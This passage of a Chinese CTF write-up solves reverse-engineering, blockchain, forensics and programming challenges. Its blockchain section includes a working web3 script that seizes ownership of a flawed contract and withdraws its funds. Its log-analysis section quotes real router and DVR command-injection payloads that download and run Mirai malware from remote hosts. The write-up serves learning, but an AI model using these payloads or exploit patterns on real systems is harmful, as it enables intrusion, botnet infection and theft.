[16] 0xff - 0x10 = 0xef -> EXIT
```
得到伪码
while True:
```python
    READ char from string[IP]
    if char == '2':
        JUMP to 11
    if char == 'c':

        JUMP to 11
    JUMP to 13

    [11] WRITE '1' to string[IP]
    [13] INC IP
    JUMP to 0
```

直接遍历字符串把假flag 换一下得到flag
POFP{317a614304}
题完
### 4. vmmm
反汇编定位
```python
struct VM {
    uint32_t regs[17];      // r0-r16, r16 作为栈指针SP
    uint32_t pc;            // 程序计数器
    uint32_t flags;         // ZF/SF/CF/OF 等标志位
    uint8_t *memory;        // VM 内存空间（4MB：0x000000 -
0x3FFFFF）
    uint32_t running;       // 运行标志
};
```
内存布局：
```
•
0x000000 - 0x0FFFFF：代码段（program.bin 加载至此）
•
0x100000 - 0x1FFFFF：数据段初始区域
•
0x200000：magic 字符串与输入缓冲区
•
0x200100：处理后的flag 比较区域
•
0x200400：RC4 S-box 表（256 字节）
•
0x200000+：data.bin 加载区域
```
解析isa
| Opcode | 指令 | 操作 | 标志位 |
|--------|------|------|--------|
| 0x10 | MOV | r[dest] = r[src] | - |
| 0x11 | MOVI | r[dest] = imm32 | - |
| 0x12 | ADD | r[dest] = r[src1] + r[src2] | - |
| 0x13 | ADDI | r[dest] = r[src] + imm32 | - |
| 0x14 | SUB | r[dest] = r[src1] - r[src2] | ZF/SF/CF/OF |
| 0x15 | SUBI | r[dest] = r[src] - imm32 | ZF/SF/CF/OF |
| 0x16 | IMUL | 有符号乘法 | CF/OF |
| 0x18 | DIV | 无符号除法，rA = rA / rB | ZF/SF/CF/OF |
| 0x1A | AND | r[dest] = r[src1] & r[src2] | ZF/SF |
| 0x1B | ANDI | r[dest] = r[src] & imm32 | ZF/SF |
| 0x1C | OR | r[dest] = r[src1] \| r[src2] | ZF/SF |
| 0x1D | ORI | r[dest] = r[src] \| imm32 | ZF/SF |
| 0x1E | XOR | r[dest] = r[src1] ^ r[src2] | ZF/SF |
| 0x1F | XORI | r[dest] = r[src] ^ imm32 | ZF/SF |
| 0x20 | SHL | r[dest] = r[src1] << r[src2] | ZF/SF |
| 0x21 | SHLI | r[dest] = r[src] << (imm32 & 0x1F) | ZF/SF |
| 0x22 | SHR | 逻辑右移 | ZF/SF |
| 0x23 | SHRI | 逻辑右移立即数 | ZF/SF |
| 0x24 | SAR | 算术右移 | ZF/SF |
| 0x26 | ROR | 循环右移 | ZF/SF/CF/OF |
| 0x27 | RORI | 循环右移立即数 | ZF/SF/CF/OF |
| 0x28 | CMP | 比较 r[src1] - r[src2] | ZF/SF/CF/OF |
| 0x29 | CMPI | 比较 r[src] - imm32 | ZF/SF/CF/OF |
| 0x2A | TEST | 测试 r[src1] & r[src2] | ZF/SF |
| 0x2B | TESTI | 测试 r[src] & imm32 | ZF/SF |
| 0x2C | LOAD | r[dest] = mem[r[base] + imm32] | - |
| 0x2D | LOADR | r[dest] = mem[r[src]] | - |
| 0x2E | LOADX | r[dest] = mem[r[base] + r[idx]] | - |
| 0x2F-0x31 | STORE | 存储指令（多种寻址模式） | - |
| 0x32 | JMP | pc += rel32（相对跳转） | - |
| 0x33 | JMPR | pc += r[reg] | - |
| 0x36 | CALL | lr = pc+1; pc += rel32 | - |
| 0x37 | CALLR | lr = pc+1; pc += r[reg] + 1 | - |
| 0x38 | CALLI | lr = pc+1; pc = imm32 | - |
| 0x39 | CALLR2 | lr = pc+1; pc = r[reg] | - |
| 0x3A | JCC | 条件跳转（相对） | - |
| 0x3B | JCCI | 条件跳转（绝对地址） | - |
| 0x3C | PUSH | sp -= 4; mem[sp] = r[reg] | - |
| 0x3D | PUSH_IMM | sp -= 4; mem[sp] = imm32 | - |
| 0x3E | POP | r[reg] = mem[sp]; sp += 4 | - |

解析条件码

| Cond | 含义    | 逻辑                    |
| ---- | ----- | --------------------- |
| 0    | EQ    | ZF == 1               |
| 1    | NE    | ZF == 0               |
| 2    | CS/HS | CF == 1               |
| 3    | CC/LO | CF == 0               |
| 4    | MI    | SF == 1               |
| 5    | PL    | SF == 0               |
| 6    | VS    | OF == 1               |
| 7    | VC    | OF == 0               |
| 8    | HI    | CF == 1 && ZF == 0    |
| 9    | LS    | CF == 0 \|\| ZF == 1  |
| 10   | GE    | SF == OF              |
| 11   | LT    | SF != OF              |
| 12   | GT    | ZF == 0 && SF == OF   |
| 13   | LE    | ZF == 1 \|\| SF != OF |
| 14   | AL    | 总是真（无条件）       |
| 15   | NV    | 保留（默认假）         |

分析syscall

| ID | 功能 |
|----|------|
| 1  | 打印整数 |
| 2  | 从 VM 内存打印字符串 |
| 3  | 从 stdin 读取整数 |
| 4  | flush / printf |
| 5  | printf 变体 |
| 6  | strlen |
分析vm 字节

```python
`[0x000] 初始化：加载data.bin 到0x200000
[0x010] 输出提示："Enter flag: "
[0x030] 读取输入到缓冲区（0x200000）
[0x050] 调用RC4 初始化（地址0x1b2）
[0x1b2] RC4 密钥调度算法（KSA）- 初始化S-box 于0x200400
[0x200] RC4 伪随机生成（PRGA）+ XOR 加密
[0x2d7] 密文比较函数
[0x300] 输出"OMG YOU DID IT"或"Wrong"
[0x400] 退出
```
有rc4 变种
```
j = (4*j + S[i] + key_byte) % 256;
```

分析数据段

| 地址        | 内容       | 说明             |
| --------- | -------- | -------------- |
| 0x200000  | Magic 字符串 | 程序标识           |
| 0x200080  | 输入缓冲区    | 存储用户输入         |
| 0x200100  | 处理区域     | 中间计算结果         |
| 0x200200  | 期望密文     | 目标密文（32 字节）     |
| 0x200400  | S-box    | RC4 状态数组（256 字节） |

| 0x200600+ | Key/常量   | 可能包含key 或变换常量   |

模拟器的核心架构是
```python
class VM:
    def __init__(self):
        self.regs = [0] * 17    # r0-r16 (r16 = SP)
        self.pc = 0
        self.flags = 0          # ZF/SF/CF/OF
        self.memory = bytearray(4 * 1024 * 1024)  # 4MB 内存
        self.running = True
        self.input_buffer = []
        self.output_buffer = []
    def load_program(self, code, data):
        # 加载program.bin 到0x000000
        self.memory[0:len(code)] = code
        # 加载data.bin 到0x200000
        self.memory[0x200000:0x200000+len(data)] = data
    def mem_read32(self, addr):
        if addr > 0x3FFFFF:
            raise Exception("Memory access violation")
        return struct.unpack('<I', self.memory[addr:addr+4])[0]
    def mem_write32(self, addr, val):
        if addr > 0x3FFFFF:
            raise Exception("Memory access violation")
        self.memory[addr:addr+4] = struct.pack('<I', val)
    def step(self):
        opcode = self.memory[self.pc]
        # 通过dispatch table 调用对应handler
        # ... 实现各opcode 逻辑
    def syscall_handler(self, num):
        # 实现7 个syscall
        if num == 1:  # print_int
            val = self.regs[0]
            self.output_buffer.append(str(val))
        elif num == 2:  # print_string
            ptr = self.regs[0]
            s = self.read_string(ptr)
            self.output_buffer.append(s)
        elif num == 3:  # read_int/read_string
            # 从预设输入或stdin 读取
            pass
        # ... 其他syscall
```
Mem_read32 进行了统一读取
```python
def eval_cond(self, cond):
    zf = (self.flags >> 0) & 1
    sf = (self.flags >> 1) & 1
    cf = (self.flags >> 2) & 1
    of = (self.flags >> 3) & 1
    conditions = {
        0: zf,           # EQ
        1: not zf,       # NE
        2: cf,           # CS
        3: not cf,       # CC
        4: sf,           # MI
        5: not sf,       # PL
        6: of,           # VS
        7: not of,       # VC
        8: cf and not zf, # HI
        9: not cf or zf,  # LS
        10: sf == of,     # GE
        11: sf != of,     # LT
        12: not zf and (sf == of), # GT
        13: zf or (sf != of),      # LE
        14: True,         # AL
        15: False         # NV
    }
    return conditions.get(cond, False)
```
推导flag
VM 模拟执行
对比失败点
逆向 RC4 变种流程

最终恢复 32 字节 ASCII 输入。
成功后OMG YOU DID IT

### 5. 分组密码
在 main 附近（约 0x4012E0）可观察到如  
下逻辑：  

1. puts("input your flag:\n")  
2. fgets 读入 flag 到栈缓冲区  
3. strlen / 遍历计数  
   o 长度 < 0x20 (32) → flag length error  

Flag 格式校验  

程序通过 小端 dword 比较硬编码校验前  
缀：  

• POFP  
• CTF{  

并且检查：  

第 32 个字符（index = 31）必须是 }  

加密逻辑  

Key / IV 初始化  

在栈上可看到：  

• Key：16 字节（4 个 dword）  
• IV：16 字节（4 个 dword）  

均以 小端序写入。  

3.2 期望密文  

.rdata 段中存在两块连续的 16 字节常量：  

• C1  
• C2  

程序最终对加密结果执行 memcmp。  

通过跟踪寄存器可得：  

• 第 1 块：P1 ⊕ IV → Enc → C1  
• 第 2 块：P2 ⊕ C1 → Enc → C2  

明确是 CBC 模式，而非 ECB。  

提取关键数据  

Key（小端）  

0xf3022201  
0xf7e6f544  
0x0b0ab9a8  
0xffeecdac  

转换为字节序列：  

01 22 02 f3 44 f5 e6 f7 a8 b9 0a 0b ac cd ee ff  

IV（小端）  

0x278cf13a  
0xe2609bd4  
0xc3a75d11  
0x4eb8097f  

字节序列：  

3a f1 8c 27 d4 9b 60 e2 11 5d a7 c3 7f 09 b8  
4e  

Ciphertext  

C1 = 2b1bc999bebde68530c90910263cf326  
C2 = 62e7d0ede09f07cf3e7e21bdf729119e  

S-box / Rcon  

• S-box：.rdata:0x403158，256 字节  
• Rcon：.rdata:0x403258 起，非标准 AES  

Rcon  

解密思路  

提取自定义 S-box；rcon  
按 AES-128 结构实现 魔改 Key Expansion  

实现：  

• 魔改 ShiftRows / InvShiftRows  
• 标准 MixColumns / InvMixColumns  

对密文执行 AES 解密  

按 CBC 规则还原明文：  

P1 = Dec(C1) ⊕ IV  
P2 = Dec(C2) ⊕ C1  

得 POFPCTF{3c55d6342a6b15f13b55747}  

题目完  

### 6. 深渊密令
1.基本信息  

• 文件类型：64-bit ELF（Linux）  
• 运行行为：  
o 启动后提示 Passcode:  
o 输入错误不输出 flag  

• strings 可见假 flag（诱饵）：  
POFP{THIS_IS_NOT_THE_REAL_FLAG_TRY_H  ARDER}  

2.程序整体流程  

main 的核心逻辑如下：  

  1.反调试  

ptrace(PTRACE_TRACEME, ...)  

• 返回 -1 直接退出  
• 调试时需 patch 或 hook  
• 直接运行不触发  

  2.完整性校验（CRC32）  

• 校验 .rodata 中一段 0x313 字节的 blob  
• 地址：0x403720  
• 期望 CRC32：  
• 0xF2B6846C  
• 不匹配输出 corrupt 并退出  

  3.Xorshift 流解密  

• 解密函数如下：  

• x ^= x << 13  
• x ^= x >> 17  
• x ^= x << 5  

• buf[i] ^= (x & 0xff)  

内容 长度 Seed  

VM 字节码 0x313 0xA17B3C91  
expected32 32 0x1D2E3F40  

使用了 2 个不同的 seed  

3.VM 结构  

VM 状态  

• reg[0..7]：8 个 8-bit 寄存器  
• mem[]：≥ 0x310 字节内存  

• 用户输入的 32 字节 → mem[0..31]  

校验点  

执行 VM 后：  

memcmp(mem[0x80:0xA0], expected32, 32)  

相等才进入 flag 解密/输出逻辑。  

4.VM 指令集  

共 12 个 opcode（跳表 dispatch）：  

| Opcode | 指令  | 语义 |
|--------|------|------|
| 0      | NOP  | 无 |
| 1      | MOVI r, imm | r = imm |
| 2      | LOAD r, idx | r = mem[idx] |
| 3      | STORE r, idx | mem[idx] = r |
| 4      | ADDI r, imm | r += imm |
| 5      | XORI r, imm | r ^= imm |
| 6      | ROL r, imm | rol(r, imm&7) |
| 7      | SBOX r | AES S-box |
| 8      | MULI r, imm | r *= imm |
| 9      | ADDR ra, rb | ra += rb |
| 10     | JNZ r, off | if r!=0 跳 |
| 11     | JMP off | 无条件跳 |  

实际执行流具有以下特征：  

• VM 对 每个输入字节独立处理  

• 每段逻辑形如：  
```
LOAD r0, i  
ADDI r0, c1  
XORI r0, c2  
ROL r0, c3  
SBOX r0  
MULI r0, c4  
ADDI r0, c5  
STORE r0, 0x80+i  
```
6 解法思路  

1. 解密 VM 字节码与 expected32  
2. 跑一遍 VM，记录真实执行的指令序列  
3. 按 STORE r?, 0x80+i 切分为 32 段  
4. 对每段：  
o 构造 f(x): uint8 → uint8  
o 枚举 x ∈ [0,255]  
o 反查 f(x) == expected[i]  
1. 拼接得到 passcode  
   
7 求解
```python
from pathlib import Path
from typing import List, Tuple

TARGET_FILE = "./ml"

def xs32_stream(data: bytes, seed: int) -> bytes:
    state = seed & 0xffffffff
    buf = bytearray(data)
    for i in range(len(buf)):
        state ^= (state << 13) & 0xffffffff
        state ^= (state >> 17)
        state ^= (state << 5) & 0xffffffff
        buf[i] ^= state & 0xff
    return bytes(buf)

def rotl8(v: int, r: int) -> int:
    r &= 7
    if r == 0:
        return v & 0xff
    return ((v << r) | (v >> (8 - r))) & 0xff

def trace_vm(bytecode: bytes) -> List[int]:
    regs = [0] * 8
    mem = [0] * 0x310
    ip = 0
    budget = 0x30D40
    visited = []

    while budget > 0 and ip < len(bytecode) and ip <= 0x312:
        opcode = bytecode[ip]
        visited.append(ip)
        if opcode > 0x0B:
            break
        if opcode == 0:              # NOP
            ip += 1
        elif opcode == 7:            # SBOX
            r = bytecode[ip + 1]
            if r < 8:
                regs[r] = AES_SBOX[regs[r]]
            ip += 2
        elif opcode == 11:           # JMP
            delta = int.from_bytes(
                bytes([bytecode[ip + 1]]),
                "little",
                signed=True
            )
            ip = ip + 2 + delta
        else:
            a = bytecode[ip + 1]
            b = bytecode[ip + 2]
            if opcode == 1 and a < 8:
                regs[a] = b
            elif opcode == 2 and a < 8:
                regs[a] = mem[b]
            elif opcode == 3 and a < 8:
                mem[b] = regs[a]
            elif opcode == 4 and a < 8:
                regs[a] = (regs[a] + b) & 0xff
            elif opcode == 5 and a < 8:
                regs[a] ^= b
            elif opcode == 6 and a < 8:
                regs[a] = rotl8(regs[a], b)
            elif opcode == 8 and a < 8:
                regs[a] = (regs[a] * b) & 0xff
            elif opcode == 9 and a < 8 and b < 8:
                regs[a] = (regs[a] + regs[b]) & 0xff
            elif opcode == 10:
                off = int.from_bytes(bytes([b]), "little",
signed=True)
                if a < 8 and regs[a] != 0:
                    ip = ip + 3 + off
                    budget -= 1
                    continue
            ip += 3
        budget -= 1
    return visited
def slice_program(trace: List[int], code: bytes) ->
List[List[Tuple[int, bytes]]]:
    instr_map = {}
    for pc in trace:
        op = code[pc]
        if op == 0:
            size = 1
        elif op in (7, 11):
            size = 2
        else:
            size = 3
        instr_map[pc] = code[pc:pc + size]
    ordered = [(pc, instr_map[pc]) for pc in trace if pc in
instr_map]
    chunks = []
    buf = []
    for pc, raw in ordered:
        buf.append((pc, raw))
        if raw[0] == 3 and 0x80 <= raw[2] < 0xA0:
            chunks.append(buf)
            buf = []
    return chunks
def eval_block(block, input_byte: int) -> int:
    regs = [0] * 8
    mem = [0] * 0x310
    src = next(r[2] for _, r in block if r[0] == 2)
    mem[src] = input_byte
    for _, inst in block:
        op = inst[0]
        if op in (0, 10, 11):
            continue
        elif op == 1:
            regs[inst[1]] = inst[2]
        elif op == 2:
            regs[inst[1]] = mem[inst[2]]
        elif op == 3:
            mem[inst[2]] = regs[inst[1]]
        elif op == 4:
            regs[inst[1]] = (regs[inst[1]] + inst[2]) & 0xff
        elif op == 5:
            regs[inst[1]] ^= inst[2]
        elif op == 6:
            regs[inst[1]] = rotl8(regs[inst[1]], inst[2])
        elif op == 7:
            regs[inst[1]] = AES_SBOX[regs[inst[1]]]
        elif op == 8:
            regs[inst[1]] = (regs[inst[1]] * inst[2]) & 0xff
        elif op == 9:
            regs[inst[1]] = (regs[inst[1]] + regs[inst[2]]) & 0xff
    return mem[block[-1][1][2]]

if __name__ == "__main__":
    raw = Path(TARGET_FILE).read_bytes()

    vm_code = xs32_stream(raw[0x3720:0x3720 + 0x313], 0xA17B3C91)
    check = xs32_stream(raw[0x3A70:0x3A70 + 32], 0x1D2E3F40)
    AES_SBOX = raw[0x3620:0x3620 + 256]
    pc_trace = trace_vm(vm_code)
    blocks = slice_program(pc_trace, vm_code)
    assert len(blocks) == 32
    secret = []
    for i, blk in enumerate(blocks):
        reverse = [0] * 256
        for v in range(256):
            out = eval_block(blk, v)
            reverse[out] = v
        secret.append(reverse[check[i]])
    print("passcode =", bytes(secret).decode())
```
passcode = ABYSSAL_VM_2026__POFP__LIFTME!!!

### 7. RRRacket
检查文件，是一个Racket 编译后的字节码文
chall.zo，以及IDA 分析文件。Racket 是
Lisp/Scheme 的一种方言，其字节码文件包含
编译后的代码。
字符串分析
- `"pofpkey"` - 疑似加密密钥
   - `"Input flag: "` - 程序提示输入
   - `"Wrong!."` - 错误提示
   - `"rc4-bytes"` - 指示使用RC4 加密算法
   - `"byte->hex"`, `"read-line/trim"` - 相关函数
找到长十六进制字符串：
`d31fa2c26c024feddef9b38853790c00285e367
b916d49a111bfc2bcfb74`
函数分析
只发现几个小函数，大部分逻辑隐藏在
Racket 运行时中
存在`sub_3AD9`等函数，但规模很小
 从字符串rc4-bytes 推测为rc4 加密算法

综合pofpkey 字符串推测
```
密钥: pofpkey
密文d31fa2c26c024feddef9b38853790c00285e367b916d49a111bfc2bcfb74
```
写个小脚本
``` python
import binascii
def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        result.append(byte ^ k)
    return bytes(result)
hex_str =
'd31fa2c26c024feddef9b38853790c00285e367b916d49a111bfc2bcfb74'
ciphertext = binascii.unhexlify(hex_str)
key = b'pofpkey'
plaintext = rc4(key, ciphertext)
print(plaintext.decode())
```
题完

### 8. XOR
题目提示 nutika  

找下字符串 nutika_onefile_start  

确认为 nutika onefile 打包  

解包  

程序会在 %temp% 生成 onefile_{PID}_{TIME}  

Cp  

得到 script,dll 主逻辑  

Python312.dll 和其他依赖文件  

分析 script.dll  

发现关键字符串有 enterflag  

Success//wrong  

证明是 nutika 常量区  

解析 python 常量池的密文  

Nutika 对 list 的常量编码形式是  

L+（l<value>）*L  

故在 enc_flag 搜索  

L(0x17)；L=23  

后续 23 为密文  

十进制是
```python
[122,101,108,122,81,88,25,92,25,88,89,27,68,77,1
17,27,89,117,76,95,68,11,87]
```
题目名xor，思考还原逻辑
```python
已知flag 格式是POFP{开头
key = enc[0] ^ 'P' = 0x7A ^ 0x50 = 0x2A
enc[1]^'O' = 0x65 ^ 0x4F = 0x2A
enc[2]^'F' = 0x6C ^ 0x46 = 0x2A
enc[3]^'P' = 0x7A ^ 0x50 = 0x2A
enc[4]^'{' = 0x51 ^ 0x7B = 0x2A
```
完整flag为
```
flag[i] = enc_flag[i]^0x2a
```
得到明文flag
题目完
好像一开始做出来了但是交错题了？忘了

## Blockchain
### 1. 好像忘了啥
分析代码
GetStatus()函数
solidity
```python
function getStatus() public returns (address, uint256) {
    return (owner = msg.sender, balance);
}
```
把返回onwer 值变成了赋值
可以利用此函数成为owner。
调用withdrawAll()提取资金
监听FlagRevealed 得到flag
```python
from web3 import Web3
from eth_account import Account

RPC_URL = "http://xx.com:xx/rpc/"
CHAIN_ID = 1337
PRIVATE_KEY = "0xa03a6958be6711aec 脱敏脱敏脱敏
f76fa7862eebe95085b1222ce243a"
CONTRACT_ADDRESS = "0x33E32Fb6b0c 脱敏脱敏脱敏0cd8A6c29cCb1"

CONTRACT_ABI = [
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "",
"type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getStatus",
        "outputs": [
            {"internalType": "address", "name": "", "type":
"address"},
            {"internalType": "uint256", "name": "", "type":
"uint256"}
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "withdrawAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getContractBalance",
        "outputs": [{"internalType": "uint256", "name": "",
"type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "anonymous": False,
        "inputs": [
            {"indexed": True, "internalType": "address", "name":
"revealer", "type": "address"},
            {"indexed": False, "internalType": "string", "name":
"flag", "type": "string"}
        ],
        "name": "FlagRevealed",
        "type": "event"
    }
]

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))

    print(f"连接 {w3.is_connected()}")

    account = Account.from_key(PRIVATE_KEY)
    print(f"账户地址: {account.address}")

    contract = w3.eth.contract(address=CONTRACT_ADDRESS,
abi=CONTRACT_ABI)

    # 检查历史事件
    print("\n 检查历史FlagRevealed 事件...")
    try:
        events =
contract.events.FlagRevealed().get_logs(from_block=0,
to_block='latest')
        if events:
            print(f"找到 {len(events)} 个历史事件")
            for event in events:
                print(f"\n{'='*60}")
                print(f"Flag: {event['args']['flag']}")
                print(f"区块: {event['blockNumber']}")
                print(f"{'='*60}")
                return
    except Exception as e:
        print(f"没有历史事件{e}")

    print("\nnext")

    print("调getStatus()...")
    nonce = w3.eth.get_transaction_count(account.address)
    tx = contract.functions.getStatus().build_transaction({
        'from': account.address,
        'nonce': nonce,
        'gas': 100000,
        'gasPrice': w3.eth.gas_price,
        'chainId': CHAIN_ID
    })

    signed_tx = account.sign_transaction(tx)
    tx_hash =
w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"交易发送: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"交易确认")
    current_owner = contract.functions.owner().call()
    if current_owner.lower() == account.address.lower():
        print(f"我是大s")
        print(f"我不是s{current_owner}")
        return
    balance = contract.functions.getContractBalance().call()
    print(f"\n 余额宝{w3.from_wei(balance, 'ether')} ETH")
    if balance == 0:
        print("花呗")
        return
    print("调withdrawAll")
    nonce = w3.eth.get_transaction_count(account.address)
    tx = contract.functions.withdrawAll().build_transaction({
        'from': account.address,
        'nonce': nonce,
        'gas': 100000,
        'gasPrice': w3.eth.gas_price,
        'chainId': CHAIN_ID
    })

    signed_tx = account.sign_transaction(tx)
    tx_hash =
w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"交易发送{tx_hash.hex()}")

    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"交易确认")

    print("\n 解析flag 事件")
    logs =
contract.events.FlagRevealed().process_receipt(receipt)
    if logs:
        flag = logs[0]['args']['flag']
        print(f"\n{'='*60}")
        print(f"Flag{flag}")
        print(f"{'='*60}")
    else:

        print("未找到FlagRevealed 事件")

if __name__ == "__main__":
    main()
```
得到flag，题完

## Forensics
### 1. 深夜来客

工具可以一把梭明文

![Image 0](./2026-3-1-furryctf/page_65_img_0.jpeg)

题略

### 2. 溯源
本题使用了ai 进行日志分析
1. 正常请求  

来自手机的 GET 请求，访  
问 /static/js/.js、/static/index.2da1efab.css、  
/static/tabbar/.png、/static/index/log  
o-login.jpg 等 Vue/uni-app 资源文件，响应  
304 或 200。  

UA 典型为 Android/iOS 浏览器、Quark、  
HuaweiBrowser、MiuiBrowser 等。  

这是学校作业管理系统的合法用戶访问，无  
异常。  

2. 常见扫描/探测  

1. 多次 GET /.env、/.git/config、/robots.txt、  
/sitemap.xml、/.well-known/security.txt  
等，部分响应 200  

2. PROPFIND / （WebDAV 扫描 185.244.104.2 多次，响  
应 405）。  

3. CONNECT  
api.my-ip.io、postman-echo.com、www.google.com  
等代理/隧道探测，响应 400。  

4. /hudson、/actuator/gateway/routes、/xmlrpc.php 、  
XDEBUG_SESSION_START=phpstorm、/version 等  
（Spring/Laravel/Jenkins/WordPress 等通用扫描）。  

6. malformed TLS、RDP（mstshash=Administr）、SMB、  
SQL、GIOP 等二进制探测（响应 400）。  

CensysInspect、zgrab、GPTBot、AhrefsBot、  
7. MJ12bot 等爬虫/扫描器。  

这些是常规互联网噪音，未指向特定 CVE 利用  

3. 关键可疑 payload（两个具体 CVE）  

CVE-2023-1389  
(TP-Link Archer AX21 命令注入)  

IP 221.159.119.6 在 03:58:31 和 03:58:32 连  
续发送完全相同的：  

GET /cgi-bin/luci/;stok=/locale?  
form=country&operation=write&country=$(wg  
et  
http://0.0.0.0/router.tplink.sh -O-|sh)  

响应均为 200。  

查阅得到 CVE-2023-1389   
（Tenable/Exploit-DB/NVD 确认），需要两次  
请求  
（第一次 set，第二次 exec），root 权限执  
行。  

但响应仅 200，未明确“成功创建/下载”迹象，  
可能只是尝试。  

CVE-2024-3721 (TBK DVR 命令注入)  

IP 144.172.98.50 在 23:24:12 发送：  

POST /device.rsp?  
opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&m  
db=sos&mdc=cd%20%2Ftmp%3Brm%20boatne  
t.arm7%3B%20wget%20http%3A%2F%2F103.77.24  
1.165%2Fhiddenbin%2Fboatnet.arm7  
%3B%20chmod%20777%20%2A%3B%20.%2Fboatn  
et.arm7%20tbk  

响应 201 Created。  

这是 CVE-2024-3721 的精确 payload  
针对 TBK DVR-4104/DVR-4216，通过  
mdb/mdc 参数在 /device.rsp 执行 OS 命令注  
入。boatnet.arm7 是知名 Mirai 变种 botnet  
payload。201 Created 强烈表明命令执行成功  
（下载/创建了恶意文件并可能运行）  

题目完  

### 3. 谁动了我的钱包

本题使用了grok 大模型进行追踪资金流动

资金在第一跳（从被害人账户转出）
后流向5 个钱包地址
这些接收地址经历了多次转出跳转
追踪得到
0xFF7C350e70879d04a13bb2d8d77b60e603b7
db72
题完

![Image 0](./2026-3-1-furryctf/page_69_img_0.jpeg)

## PPC
### 1. flagreader
burpsuite 抓包分析写个脚本爆就行了
import requests

BASE_URL = "http://xx.xx.xx:xx/api/flag/char/{}"

chars = []

```python
for i in range(1, 481):
    r = requests.get(BASE_URL.format(i), timeout=5)
    j = r.json()
    print(j["char"], end="", flush=True)
    chars.append(j["char"])
print()
hex_data = "".join(chars)
print("\nhex")
print(hex_data)
```

# 第一次 Base16 (Hex) 解码
```python
decoded_1 = bytes.fromhex(hex_data).decode()
print("\n1.Base16 解码")
print(decoded_1)
```

# 第二次 Base16 (Hex) 解码
```python
decoded_2 = bytes.fromhex(decoded_1).decode()
print("\n2.Base16 解码")
print(decoded_2)
```

## 2.你说这是个数学题？
加密逻辑
1. flag 先被转换为二进制字符每个字符
的二进制表示去掉了“0b”前缀的字符

串
2. matrix 初始化了一个单位矩阵，大小
是二进制字符串长度
result 初始化二进制字符串的整数列表
形式（flag 原始比特位）
3. 大量的随机转换
每次选择两行“i”;“j”
`matrix[j] ^= matrix[i]`：将第 `i` 行异或到第 `j`
行。
 `result[j] ^= result[i]`：将第 `i` 个结果位异或到
第 `j` 个结果位。
在 GF(2)上，异或操作等价于加法，实际上是对
矩阵进行了初等行变换。
设 $x$ 为原始的 Flag 二进制向量。
初始状态满足 $I \cdot x = x$。
每一步行变换等于左乘一个初等矩阵 $E_k$。
变换应用于矩阵 $M$，也应用于结果向量
$r$。
```python
$M_{new} = E_k \cdot M$
$r_{new} = E_k \cdot r$
```

故经历$N$ 次变换后有
```python
$M_{final} = (\prod E_k) \cdot I$
$r_{final} = (\prod E_k) \cdot x$
```
因此，存在线性关系：
```python
$$ M_{final} \cdot x = r_{final} $$
现已知$M_{final}$ 和 $r_{final}$，求解 $x$
```
解题思路：
从脚本注释提取最终的matrix 和result
```python
用高斯消元法在GF(2)域上求解$x = M_{final}^{-
1} \cdot r_{final}$
```
因为是在GF(2)所以加减法==XOR
解码：原始编码使用了
bin(ord(c)).replace(“0b”,””)
使得不同字符二进制长度不等
故不能按照固定长度解码
结合题目提示语义通顺
直接利用优先搜索法解码
``` python
import ast

def solve():

    try:
        with open('../Encrypt.py', 'r') as f:
            lines = f.readlines()
    except FileNotFoundError:
        try:
            with open('Encrypt.py', 'r') as f:
                lines = f.readlines()
        except FileNotFoundError:
            print("Encrypt.py404")
            return

    matrix_str = ""
    result_str = ""
    for line in lines:
        if line.startswith("#matrix="):
            matrix_str = line[len("#matrix="):].strip()
        elif line.startswith("#result="):
            result_str = line[len("#result="):].strip()
    if not matrix_str or not result_str:
        print("Encrypt.py 中未找到矩阵或结果数据")
        return

    M_rows = ast.literal_eval(matrix_str)
    R = ast.literal_eval(result_str)

    M = []
    for row_str in M_rows:
        M.append([int(c) for c in row_str])

    N = len(M)
    print(f"Matrix size: {N}x{N}")

    for i in range(N):
        M[i].append(R[i])

    pivot_row = 0
    for col in range(N):
        if pivot_row >= N:
            break

        k = pivot_row

        while k < N and M[k][col] == 0:
            k += 1

        if k < N:

            M[pivot_row], M[k] = M[k], M[pivot_row]

            for i in range(N):
                if i != pivot_row and M[i][col] == 1:
                    # Row XOR
                    for j in range(col, N + 1):
                        M[i][j] ^= M[pivot_row][j]

            pivot_row += 1

    x = []
    for i in range(N):

        x.append(M[i][N])

    x_str = "".join(str(b) for b in x)
    print(f"Recovered binary string: {x_str}")
    decoded_flag = decode_binary_string(x_str)
    if decoded_flag:
        print(f"Decoded Flag: {decoded_flag}")
def decode_binary_string(bstr):
    # 0-9, A-Z, a-z, _, {, }
    valid_chars = set()
    for c in
"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{
}":
        valid_chars.add(ord(c))
    results = []
    def dfs(index, current_str):
        if len(results) >= 20:
            return
        if index == len(bstr):
            results.append(current_str)
            return
        candidates = []
        # 6/7
        for l in [6, 7]:
            if index + l <= len(bstr):
                chunk = bstr[index : index + l]
                try:
                    val = int(chunk, 2)
                    reconstructed = bin(val).replace("0b", "")
                    if reconstructed == chunk:
                        if val in valid_chars:
                            candidates.append((l, chr(val)))
                except:
                    pass
        candidates.sort(key=lambda x: x[0], reverse=True)

        for l, char in candidates:
            dfs(index + l, current_str + char)
            if len(results) >= 20:
                return
    dfs(0, "")
    if not results:
        print("无有效值")
        return None
    print(f"{len(results)} 个有效值/最可能的是:")
    for r in results:
        print(f"候选: {r}")

    return results[0] if results else None

if __name__ == "__main__":
    solve()
```
最满足语义的flag 是
furryCTF{Xa2_Matr1x_Wi7h_On9_Uni9ue_S0lut1on}
题完

## AI
